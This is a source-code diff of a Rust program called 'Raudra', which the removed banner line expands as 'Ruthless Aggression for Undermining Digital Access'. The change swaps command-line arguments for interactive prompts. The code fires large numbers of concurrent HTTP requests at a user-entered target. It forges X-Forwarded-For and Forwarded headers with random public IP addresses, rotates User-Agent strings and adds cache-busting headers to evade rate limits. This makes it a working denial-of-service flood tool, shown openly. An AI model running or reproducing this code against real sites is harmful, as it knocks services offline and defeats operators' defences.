@@ -1,32 +1,13 @@
-use clap::Parser;
+use std::io;
 use reqwest::redirect::Policy;
-use serde::{Serialize};
 use tokio::{main};
 use reqwest::{Client,header::{HeaderMap,HeaderValue,FORWARDED,USER_AGENT}};
 use std::{sync::{Arc,Mutex}, time::Instant};
 use std::fs;
-use std::time::Duration;    
 use hdrhistogram::Histogram;    
 use rand::Rng; 
 use colored::*;
-#[derive(Parser,Debug)]
 
-struct Args{
-
-    // number of concurrent requests that the user wants to make
-    #[arg(short,long)]
-    requests:u32,
-    #[arg(short,long)]
-    duration:u32,
-
-    // url and ip are mutually exclisive
-    #[arg(short,long,default_value = "NONE")]
-    url:String,
-    #[arg(short,long,default_value = "NONE")]
-    ip:String,
-}
-
-#[derive(Serialize,Debug)]
 struct Summary{
 
     total:u32,
@@ -61,7 +42,6 @@ impl Summary{
 
 }
 
-#[derive(Serialize)]
 struct LatencySummary {
     min: f64,
     max: f64,
@@ -98,114 +78,143 @@ impl LatencySummary {
 
 #[main]
 async fn main() -> Result<(), Box<dyn std::error::Error> >{
-    // print_banner();
-    println!("Starting Ruthless Aggression for Undermining Digital Access(Raudra)");
     print_banner();
-
-    let args = Args::parse();
-    // let client = Client::new();
-    let target = if args.url != "NONE" && args.ip == "NONE"{
-        args.url.clone()
-    } else if args.url == "NONE" && args.ip != "NONE"{
-        args.ip.clone()
-    } else if args.url != "NONE" && args.ip != "NONE"{
-        eprintln!("Error: Cannot use both url and ip. Please provide only one.");
-        return Ok(())
-    } else{
-        eprintln!("Error: Please provide either --url or --ip");
-        return Ok(())
-    };
-    
-    let resp_summary = Arc::new(Mutex::new(Summary::new()));
-    // let mut latency_tracker = LatencyTracker::new();
-    let client = Client::builder()
-            .redirect(Policy::limited(3))
-            .build()?;
-
-    let tot_requests = args.requests;
+    loop {
 
 
-    let histogram = Arc::new(Mutex::new(
-        Histogram::<u64>::new_with_max(60_000_000, 3).unwrap()
-    ));
+        let mut input = String::new();
+        println!("Do you want to begin!?");
+        println!("For yes enter Y/y else N/n");
+        
+        io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read line");
+        
+        input = input.trim().to_lowercase();;
 
-    let mut tasks = vec![];
-    for _ in 0..tot_requests{
-        let client = client.clone();
-        let target = target.clone();
-        let user_agent = user_agent_rotator()?;
-        let fake_ip = random_ip();   
+        if input == "y"{
+            let mut target = String::new();
+            println!("Enter the target");
+            io::stdin()
+            .read_line(&mut target)
+            .expect("Failed to read line");
+            let requests: u32 = loop {
+                let mut input = String::new();
 
-        let mut headers = HeaderMap::new();
-        headers.insert(
-            "X-Forwarded-For",
-            HeaderValue::from_str(&fake_ip)?,
-        );
-        headers.insert(
-            FORWARDED,
-            HeaderValue::from_str(&format!("for={}; proto=https", fake_ip))?,
-        );
-        headers.insert(
-            USER_AGENT,
-            HeaderValue::from_str(
-                &user_agent,
-            )?,
-        );
+                println!("Enter the number of requests:");
+
+                io::stdin()
+                .read_line(&mut input)
+                .expect("Failed to read input");
 
 
-
-        let summary = Arc::clone(&resp_summary);
-        let histogram = Arc::clone(&histogram);
-
-
-
-
-        tasks.push(tokio::spawn(async move{
-                    // let latency_tracker = Arc::clone(&latency_tracker);
-                    let start = Instant::now();
-                    let resp = client.get(target)
-                    .headers(headers)
-                    .header("Cache-Control", "no-cache, no-store, must-revalidate")
-                    .header("Pragma", "no-cache")
-                    .header("Expires", "0")
-                    .send()
-                    .await;
-                    
-                    let duration = start.elapsed().as_micros() as u64;
-                    
-                    histogram.lock().unwrap().record(duration).ok();
-                    
-                    let mut s = summary.lock().unwrap();
-                    match resp{
-                        Ok(_) => s.add_success(),
-                        Err(_) => s.add_failed(),
+                match input.trim().parse::<u32>() {
+                    Ok(num) => break num,
+                    Err(_) => {
+                        println!("❌ Invalid input! Please enter a valid positive number.\n");
+                        continue;
                     }
+                }
+            };
 
-        }))
+            let mut tasks = vec![];
+            let client = Client::builder()
+                    .redirect(Policy::limited(3))
+                    .build()?;
 
+            let resp_summary = Arc::new(Mutex::new(Summary::new()));
+
+            let histogram = Arc::new(Mutex::new(
+                Histogram::<u64>::new_with_max(60_000_000, 3).unwrap()
+            ));
+
+
+            for _ in 0..requests{
+                let client = client.clone();
+                let target = target.clone();
+                let user_agent = user_agent_rotator()?;
+                let fake_ip = random_ip();  
+
+                let mut headers = HeaderMap::new();
+                headers.insert(
+                    "X-Forwarded-For",
+                    HeaderValue::from_str(&fake_ip)?,
+                );
+                headers.insert(
+                    FORWARDED,
+                    HeaderValue::from_str(&format!("for={}; proto=https", fake_ip))?,
+                );
+                headers.insert(
+                    USER_AGENT,
+                    HeaderValue::from_str(
+                        &user_agent,
+                    )?,
+                );
+
+
+                let summary = Arc::clone(&resp_summary);
+                let histogram = Arc::clone(&histogram);
+
+                tasks.push(tokio::spawn(async move{
+
+                            let start = Instant::now();
+                            let resp = client.get(target)
+                            .headers(headers)
+                            .header("Cache-Control", "no-cache, no-store, must-revalidate")
+                            .header("Pragma", "no-cache")
+                            .header("Expires", "0")
+                            .send()
+                            .await;
+
+                            let mut s = summary.lock().unwrap();
+
+                            match &resp {
+                                Ok(response) => {
+                                    println!("Status: {}", response.status());
+                                    s.add_success();
+                            },
+                                Err(e) => {
+                                    println!("Error: {:?}", e);
+                                    s.add_failed();
+                            },
+                            }   
+
+                            let duration = start.elapsed().as_micros() as u64;
+                            histogram.lock().unwrap().record(duration).ok();
     
+                }));
+            }
+                for task in tasks{
+                    
+                    let _ = task.await;
+
+                }      
+                
+                let summary = resp_summary.lock().unwrap();
+                summary.print_stat();
+                
+                let hist = histogram.lock().unwrap();
+                let latency_summary = LatencySummary::from_histogram(&hist);
+                
+                latency_summary.print();
+            
+            
+            }else{
+                break;
+            }
+
+
+            
+
+
+            
     }
-
-
-    for task in tasks{
-
-        let _ = task.await;
     
-    }
-
-    let summary = resp_summary.lock().unwrap();
-    summary.print_stat();
-    
-    let hist = histogram.lock().unwrap();
-    let latency_summary = LatencySummary::from_histogram(&hist);
-    
-    latency_summary.print();
+    println!("Thanks For Using Raudra");
     Ok(())
+        
+        
     }
-
-
-
-    
 
 fn user_agent_rotator() -> std::result::Result<String, Box<dyn std::error::Error>> {
     // Read the entire file as a string
@@ -227,10 +236,45 @@ fn user_agent_rotator() -> std::result::Result<String, Box<dyn std::error::Error
     Ok(user_agents[rand_index].to_string())
 }
 
-fn random_ip() -> String{
-    let mut rgn = rand::thread_rng();
-    format!("{}.{}.{}.{}",rgn.gen_range(0..256),rgn.gen_range(0..256),rgn.gen_range(0..256),rgn.gen_range(0..256))
+
+fn random_ip() -> String {
+    let mut rng = rand::thread_rng();
+
+    loop {
+        let a = rng.gen_range(1..=255);
+        let b = rng.gen_range(0..=255);
+        let c = rng.gen_range(0..=255);
+        let d = rng.gen_range(0..=255);
+
+        // Exclude private range 10.0.0.0/8
+        if a == 10 {
+            continue;
+        }
+
+        // Exclude private range 172.16.0.0/12
+        if a == 172 && (16..=31).contains(&b) {
+            continue;
+        }
+
+        // Exclude private range 192.168.0.0/16
+        if a == 192 && b == 168 {
+            continue;
+        }
+
+        // Exclude loopback range 127.0.0.0/8
+        if a == 127 {
+            continue;
+        }
+
+        // Exclude multicast range 224.0.0.0 to 239.255.255.255
+        if (224..=239).contains(&a) {
+            continue;
+        }
+
+        return format!("{}.{}.{}.{}", a, b, c, d);
+    }
 }
+
 fn print_banner() {
     println!("\n");
     
